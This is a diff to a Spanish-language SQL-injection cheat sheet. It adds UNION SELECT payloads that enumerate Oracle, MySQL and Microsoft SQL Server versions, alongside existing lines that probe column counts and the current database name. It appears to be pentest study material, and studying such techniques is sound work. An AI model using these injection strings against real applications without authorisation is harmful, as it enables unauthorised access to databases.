@@ -60,6 +60,11 @@ Después de saber cuantas columnas existen podemos usar Union Select para meter 
 ❯ ' union select NULL,NULL,NULL -- -                  # Aveces solo acepta NULL en lugar de numeros
 ❯ ' union select "test",NULL,NULL -- -                # Podemos colocar texto 
 ❯ ' union select database(),NULL,NULL -- -            # Queremos que muestre el nombre de la base de datos actual en uso
+
+❯ ' union select NULL,NULL from dual-- -              # Dual es una tabla existente en Oracle
+❯ ' union select NULL,banner from v$version-- -       # Mirar la version en Oracle
+
+❯ ' union select NULL,@@version-- -                   # Mirar la version de MySQL y Microsoft
 ```
 
 Para saber las bases de datos (DB) existentes.
